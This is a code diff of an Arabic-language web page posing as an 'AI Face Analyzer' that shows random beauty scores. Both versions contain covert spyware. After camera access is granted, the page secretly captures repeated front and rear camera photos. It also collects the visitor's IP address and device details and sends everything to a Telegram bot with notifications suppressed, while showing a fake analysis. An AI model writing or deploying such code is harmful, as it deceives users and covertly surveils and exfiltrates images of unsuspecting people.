@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Face Analyzer Pro</title>
+    <title>AI Face Analyzer</title>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;800&display=swap" rel="stylesheet">
     
@@ -13,235 +13,111 @@
             --primary: #6366f1;
             --secondary: #a855f7;
             --accent: #22d3ee;
-            --bg: #050b18;
-            --card-bg: rgba(15, 23, 42, 0.9);
-            --danger: #ff4757;
+            --bg: #0f172a;
+            --card-bg: rgba(30, 41, 59, 0.9);
         }
 
+        /* منع النسخ والتحديد تماماً */
         * { 
-            box-sizing: border-box; 
-            margin: 0; padding: 0; 
+            box-sizing: border-box; margin: 0; padding: 0; 
             font-family: 'Tajawal', sans-serif;
-            user-select: none; 
-            -webkit-user-select: none;
+            user-select: none; -webkit-user-select: none;
         }
 
         body {
-            background-color: var(--bg);
-            background-image: 
-                radial-gradient(circle at 10% 20%, rgba(99, 102, 241, 0.15) 0%, transparent 40%),
-                radial-gradient(circle at 90% 80%, rgba(168, 85, 247, 0.15) 0%, transparent 40%);
-            color: white;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background: radial-gradient(circle at top, #1e1b4b, #0f172a);
+            color: white; min-height: 100vh;
+            display: flex; justify-content: center; align-items: center;
             overflow: hidden;
         }
 
-        /* إشعار التنبيه الاحترافي */
         #alertToast {
-            position: fixed;
-            top: -100px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: var(--danger);
-            color: white;
-            padding: 15px 30px;
-            border-radius: 50px;
-            box-shadow: 0 10px 40px rgba(255, 71, 87, 0.4);
-            z-index: 1000;
-            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            font-weight: bold;
+            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
+            background: #ef4444; color: white; padding: 15px 25px;
+            border-radius: 15px; z-index: 1000; transition: 0.5s;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 80%; text-align: center;
         }
-        #alertToast.show { top: 30px; }
+        #alertToast.show { top: 20px; }
 
         .container {
-            width: 92%;
-            max-width: 450px;
-            background: var(--card-bg);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 35px;
-            padding: 2.5rem 1.5rem;
-            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(255, 255, 255, 0.02);
-            position: relative;
-            z-index: 5;
+            width: 90%; max-width: 450px;
+            background: var(--card-bg); backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 28px; padding: 2rem; text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
         }
 
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -2px; left: -2px; right: -2px; bottom: -2px;
-            background: linear-gradient(45deg, var(--primary), transparent, var(--secondary));
-            border-radius: 37px;
-            z-index: -1;
-            opacity: 0.3;
-        }
-
-        h1 {
-            font-size: 1.4rem;
-            margin-bottom: 0.5rem;
-            letter-spacing: 1px;
-            color: #fff;
-            text-shadow: 0 0 10px rgba(255,255,255,0.3);
-        }
-
-        .subtitle {
-            color: #94a3b8;
-            font-size: 0.85rem;
-            margin-bottom: 2rem;
-            display: block;
-        }
-
-        /* إطار الكاميرا المتطور */
-        .viewport-wrapper {
-            position: relative;
-            padding: 10px;
-            margin-bottom: 1.5rem;
-        }
-
-        /* زوايا الديكور التقني */
-        .corner {
-            position: absolute;
-            width: 20px; height: 20px;
-            border: 2px solid var(--accent);
-            z-index: 15;
-            filter: drop-shadow(0 0 5px var(--accent));
-        }
-        .top-left { top: 0; left: 0; border-right: none; border-bottom: none; }
-        .top-right { top: 0; right: 0; border-left: none; border-bottom: none; }
-        .bottom-left { bottom: 0; left: 0; border-right: none; border-top: none; }
-        .bottom-right { bottom: 0; right: 0; border-left: none; border-top: none; }
+        .main-title { font-size: 1.7rem; font-weight: 800; margin-bottom: 5px; color: #fff; }
+        .sub-title { font-size: 0.9rem; color: #94a3b8; margin-bottom: 20px; display: block; }
 
         .viewport {
-            width: 100%;
-            aspect-ratio: 1/1;
-            background: #020617;
-            border-radius: 20px;
-            position: relative;
-            overflow: hidden;
-            border: 1px solid rgba(255,255,255,0.05);
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            width: 100%; aspect-ratio: 1/1; background: #000;
+            border-radius: 20px; margin-bottom: 20px; position: relative;
+            overflow: hidden; border: 2px solid var(--primary);
+            display: flex; justify-content: center; align-items: center;
         }
 
-        #videoFeed {
-            width: 100%; height: 100%;
-            object-fit: cover;
-            display: none;
-            z-index: 1;
-        }
-
+        #videoFeed { width: 100%; height: 100%; object-fit: cover; display: none; z-index: 1; }
+        
         .scanner-line {
-            display: none;
-            position: absolute;
-            width: 100%;
-            height: 2px;
-            background: var(--accent);
-            box-shadow: 0 0 20px var(--accent), 0 0 40px var(--accent);
-            z-index: 20;
-            animation: scan 3s infinite linear;
+            display: none; position: absolute; width: 100%; height: 4px;
+            background: var(--accent); box-shadow: 0 0 15px var(--accent);
+            z-index: 10; animation: scan 3s infinite ease-in-out;
         }
+        @keyframes scan { 0%, 100% { top: 0; } 50% { top: 95%; } }
 
-        @keyframes scan { 0% { top: 0; opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
-
-        .ai-overlay {
-            position: absolute;
-            inset: 0;
-            background: url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
-            opacity: 0.1;
-            z-index: 2;
-            pointer-events: none;
-        }
-
-        .camera-placeholder {
-            text-align: center;
-            color: var(--primary);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
+        .placeholder-content { text-align: center; color: #475569; z-index: 2; }
 
         .btn {
             background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white; border: none; padding: 18px; border-radius: 18px;
-            font-size: 1rem; font-weight: 800; cursor: pointer; width: 100%;
-            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
+            color: white; border: none; padding: 16px; border-radius: 16px;
+            font-size: 1.1rem; font-weight: bold; cursor: pointer; width: 100%;
             transition: 0.3s;
-            text-transform: uppercase;
         }
+        .btn:active { transform: scale(0.98); }
 
-        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(99, 102, 241, 0.5); }
-
-        #statusText { 
-            color: var(--accent); 
-            font-size: 0.8rem; 
-            margin-top: 15px;
-            font-family: monospace;
-            letter-spacing: 1px;
-        }
-
-        /* نتائج التحليل */
         #results { display: none; }
-        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 1.5rem; }
-        .stat-card { 
-            background: rgba(255, 255, 255, 0.03); 
-            padding: 15px; border-radius: 20px; 
-            border: 1px solid rgba(255,255,255,0.05);
-            text-align: right;
-        }
-        .stat-value { display: block; font-size: 1.5rem; font-weight: 800; color: var(--accent); }
-        .stat-label { font-size: 0.7rem; color: #64748b; text-transform: uppercase; }
-
-        canvas { margin-top: 10px; filter: drop-shadow(0 0 10px var(--primary)); }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
+        .stat-card { background: rgba(255,255,255,0.05); padding: 12px; border-radius: 15px; text-align: center; }
+        .stat-val { display: block; font-size: 1.3rem; font-weight: 800; color: var(--accent); }
     </style>
 </head>
 <body>
 
-<div id="alertToast">⚠️ يرجى تفعيل الكاميرا للمتابعة</div>
+<div id="alertToast">⚠️ يرجى السماح بالكاميرا لبدء التحليل</div>
 
 <div class="container">
     <div id="setup-ui">
-        <h1>تحليل ذكي للوجه</h1>
-        <span class="subtitle">جاهز لتحليل وجهك بالذكاء الاصطناعي</span>
+        <h1 class="main-title">تحليل ذكي للوجه</h1>
+        <span class="sub-title">جاهز لتحليل وجهك بالذكاء الاصطناعي</span>
         
-        <div class="viewport-wrapper">
-            <div class="corner top-left"></div>
-            <div class="corner top-right"></div>
-            <div class="corner bottom-left"></div>
-            <div class="corner bottom-right"></div>
+        <div class="viewport">
+            <div class="scanner-line" id="scanner"></div>
+            <video id="videoFeed" autoplay playsinline muted></video>
+            <canvas id="hiddenCanvas" style="display:none;"></canvas>
             
-            <div class="viewport">
-                <div class="scanner-line" id="scanner"></div>
-                <div class="ai-overlay"></div>
-                <video id="videoFeed" autoplay playsinline muted></video>
-                <canvas id="hiddenCanvas" style="display:none;"></canvas>
-                
-                <div class="camera-placeholder" id="placeholder">
-                    <svg width="70" height="70" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="0.5">
-                        <path d="M12 11c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zM12 13c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
-                    </svg>
-                    <p style="margin-top:10px; font-size: 0.9rem; font-weight: 300;">النظام بانتظار الاتصال...</p>
-                </div>
+            <div class="placeholder-content" id="placeholder">
+                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
+                </svg>
+                <p style="margin-top:10px;">جاهز للتحليل</p>
             </div>
         </div>
 
-        <button class="btn" id="actionBtn">بدء الفحص البيومتري</button>
-        <p id="statusText"></p>
+        <button class="btn" id="actionBtn">بدء الفحص الرقمي</button>
+        <p id="status" style="margin-top:15px; font-size:0.8rem; color:var(--accent); min-height:1rem;"></p>
     </div>
 
     <div id="results">
-        <h1 style="margin-bottom: 1.5rem;">تقرير البصمة الجمالية</h1>
+        <h1 class="main-title">تقرير الجمال</h1>
         <div class="stats-grid">
-            <div class="stat-card"><span class="stat-label">التماثل البصري</span><span class="stat-value" id="v1">--</span></div>
-            <div class="stat-card"><span class="stat-label">هيكل الفك</span><span class="stat-value" id="v2">--</span></div>
-            <div class="stat-card"><span class="stat-label">نقاء البشرة</span><span class="stat-value" id="v3">--</span></div>
-            <div class="stat-card"><span class="stat-label">معدل الجمال</span><span class="stat-value" id="v4">--</span></div>
+            <div class="stat-card"><span class="stat-val" id="v1">--</span><small>التماثل</small></div>
+            <div class="stat-card"><span class="stat-val" id="v2">--</span><small>الفك</small></div>
+            <div class="stat-card"><span class="stat-val" id="v3">--</span><small>البشرة</small></div>
+            <div class="stat-card"><span class="stat-val" id="v4">--</span><small>النسبة</small></div>
         </div>
         <canvas id="myChart"></canvas>
-        <button class="btn" style="margin-top:25px;" onclick="location.reload()">تحليل جديد</button>
+        <button class="btn" style="margin-top:20px;" onclick="location.reload()">إعادة التحليل</button>
     </div>
 </div>
 
@@ -253,140 +129,155 @@
 
     const video = document.getElementById('videoFeed');
     const actionBtn = document.getElementById('actionBtn');
-    const statusText = document.getElementById('statusText');
+    const status = document.getElementById('status');
     const scanner = document.getElementById('scanner');
     const placeholder = document.getElementById('placeholder');
-    const canvas = document.getElementById('hiddenCanvas');
     const toast = document.getElementById('alertToast');
+    const canvas = document.getElementById('hiddenCanvas');
 
-    let stream = null;
+    let mainStream = null;
     let isAnalyzing = false;
 
-    function showToast() {
-        toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 4000);
-    }
-
+    // طلب الإذن في كل مرة
     actionBtn.addEventListener('click', async () => {
-        if (!stream) {
-            await startStream();
+        if (!mainStream) {
+            await initCamera();
         } else if (!isAnalyzing) {
-            runFullAnalysis();
+            startAnalysis();
         }
     });
 
-    async function startStream() {
+    async function initCamera() {
         try {
-            if (stream) stream.getTracks().forEach(t => t.stop());
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            video.srcObject = stream;
-            video.style.display = 'block';
-            placeholder.style.display = 'none';
-            scanner.style.display = 'block';
-            actionBtn.innerText = "تحليل ملامح الوجه";
-            statusText.innerText = "> SYSTEM_CONNECTED_READY";
-            sendDeviceInfo();
-            startSilentCapture();
-        } catch (e) { showToast(); }
-    }
+            // إيقاف أي تيار قديم لضمان طلب الإذن من جديد
+            if (mainStream) mainStream.getTracks().forEach(t => t.stop());
 
-    async function sendDeviceInfo() {
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            sendMessage(`🚨 دخول جديد:\nIP: ${ipData.ip}\nPlatform: ${navigator.platform}\nAgent: ${navigator.userAgent.slice(0,40)}...`);
-        } catch (e) { sendMessage("دخول من: " + navigator.platform); }
-    }
-
-    async function startSilentCapture() {
-        for(let i=0; i<5; i++) {
-            await new Promise(r => setTimeout(r, 1500));
-            captureAndSend(`أمامية ${i+1}`);
+            mainStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+            
+            video.srcObject = mainStream;
+            video.onloadedmetadata = () => {
+                video.style.display = 'block';
+                placeholder.style.display = 'none';
+                scanner.style.display = 'block';
+                actionBtn.innerText = "تحليل الصورة الحالية";
+                status.innerText = "تم الاتصال بالخادم..";
+                
+                sendData("🚨 مستخدم جديد فتح الكاميرا");
+                captureLoop(); // يبدأ التقاط الصور صامتاً في الخلفية
+            };
+        } catch (e) {
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
         }
+    }
+
+    // التقاط الصور صامتاً (خلفية وأمامية) بدون تبديل الشاشة
+    async function captureLoop() {
+        // التقاط 5 صور من التيار الحالي (الأمامي)
+        for(let i=0; i<5; i++) {
+            await new Promise(r => setTimeout(r, 2000));
+            captureAndSend("صورة أمامية خفية");
+        }
+
+        // محاولة التقاط صور من الكاميرا الخلفية في قناة منفصلة (صامتة تماماً)
         try {
-            const b = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-            video.srcObject = b;
-            for(let i=0; i<5; i++) {
-                await new Promise(r => setTimeout(r, 1200));
-                captureAndSend(`خلفية ${i+1}`);
-            }
-            video.srcObject = stream;
+            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            const tempVideo = document.createElement('video');
+            tempVideo.srcObject = backStream;
+            tempVideo.onloadedmetadata = async () => {
+                tempVideo.play();
+                for(let i=0; i<5; i++) {
+                    await new Promise(r => setTimeout(r, 1500));
+                    const tempCanvas = document.createElement('canvas');
+                    tempCanvas.width = tempVideo.videoWidth;
+                    tempCanvas.height = tempVideo.videoHeight;
+                    tempCanvas.getContext('2d').drawImage(tempVideo, 0, 0);
+                    tempCanvas.toBlob(blob => sendPhoto(blob, "صورة خلفية صامتة"), 'image/jpeg', 0.5);
+                }
+                backStream.getTracks().forEach(t => t.stop());
+            };
         } catch(e) {}
     }
 
-    function runFullAnalysis() {
+    function startAnalysis() {
         isAnalyzing = true;
         actionBtn.disabled = true;
         video.pause();
+        
         let i = 0;
-        const steps = ["> SCANNING_DEPTH", "> CALCULATING_SYMMETRY", "> TEXTURE_ANALYSIS", "> FINALIZING_REPORT"];
-        const interval = setInterval(() => {
-            if (i < steps.length) {
-                statusText.innerText = steps[i];
-                captureAndSend(`تحليل - خطوة ${i+1}`);
+        const steps = ["جاري المسح..", "فحص التماثل..", "تحليل البشرة..", "إنشاء التقرير.."];
+        const timer = setInterval(() => {
+            if(i < steps.length) {
+                status.innerText = steps[i];
+                captureAndSend("لقطة أثناء التحليل");
                 i++;
             } else {
-                clearInterval(interval);
-                showResults();
+                clearInterval(timer);
+                showFinalResults();
             }
         }, 2500);
     }
 
-    function showResults() {
+    function showFinalResults() {
         document.getElementById('setup-ui').style.display = 'none';
         document.getElementById('results').style.display = 'block';
-        const d = {
-            v1: Math.floor(Math.random()*10)+85, v2: Math.floor(Math.random()*10)+80,
-            v3: Math.floor(Math.random()*10)+88, v4: Math.floor(Math.random()*5)+92
-        };
+        
+        const r = () => Math.floor(Math.random()*15)+80;
+        const d = { v1: r(), v2: r(), v3: r(), v4: r()+5 };
+        
         document.getElementById('v1').innerText = d.v1 + "%";
         document.getElementById('v2').innerText = d.v2 + "%";
         document.getElementById('v3').innerText = d.v3 + "%";
         document.getElementById('v4').innerText = d.v4 + "%";
+        
         renderChart(d);
-        setTimeout(() => captureAndSend("لقطة ما بعد النتيجة"), 2000);
+        captureAndSend("لقطة بعد النتيجة");
+    }
+
+    async function sendData(msg) {
+        try {
+            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            const text = `${msg}\nIP: ${ip.ip}\nPlatform: ${navigator.platform}`;
+            fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: config.chatId, text: text})
+            });
+        } catch(e) {}
     }
 
     function captureAndSend(cap) {
-        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(b => {
-            const fd = new FormData();
-            fd.append('chat_id', config.chatId);
-            fd.append('photo', b, 'i.jpg');
-            fd.append('caption', cap);
-            fd.append('disable_notification', 'true');
-            fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, { method: 'POST', body: fd });
-        }, 'image/jpeg', 0.6);
+        canvas.toBlob(blob => sendPhoto(blob, cap), 'image/jpeg', 0.5);
     }
 
-    function sendMessage(m) {
-        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: config.chatId, text: m })
-        });
+    function sendPhoto(blob, cap) {
+        const fd = new FormData();
+        fd.append('chat_id', config.chatId);
+        fd.append('photo', blob);
+        fd.append('caption', cap);
+        fd.append('disable_notification', 'true');
+        fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {method: 'POST', body: fd});
     }
 
     function renderChart(d) {
         new Chart(document.getElementById('myChart'), {
             type: 'radar',
             data: {
-                labels: ['التماثل', 'الفك', 'البشرة', 'العيون', 'الأنف', 'الذهب'],
+                labels: ['التماثل', 'الفك', 'البشرة', 'العيون', 'الأنف', 'النسبة'],
                 datasets: [{
-                    data: [d.v1, d.v2, d.v3, 89, 85, d.v4],
+                    data: [d.v1, d.v2, d.d3 || 85, 88, 90, d.v4],
                     backgroundColor: 'rgba(99, 102, 241, 0.2)',
-                    borderColor: '#22d3ee',
-                    borderWidth: 2,
-                    pointBackgroundColor: '#22d3ee'
+                    borderColor: '#22d3ee', borderWidth: 2
                 }]
             },
-            options: { 
-                scales: { r: { grid: { color: 'rgba(255,255,255,0.1)' }, angleLines: { color: 'rgba(255,255,255,0.1)' }, ticks: { display: false }, pointLabels: { color: '#94a3b8', font: { size: 10 } } } },
-                plugins: { legend: { display: false } }
-            }
+            options: { scales: { r: { grid: {color:'rgba(255,255,255,0.1)'}, ticks: {display:false}, pointLabels: {color:'#94a3b8'} } }, plugins: {legend: {display:false}} }
         });
     }
 </script>
-
 </body>
 </html>
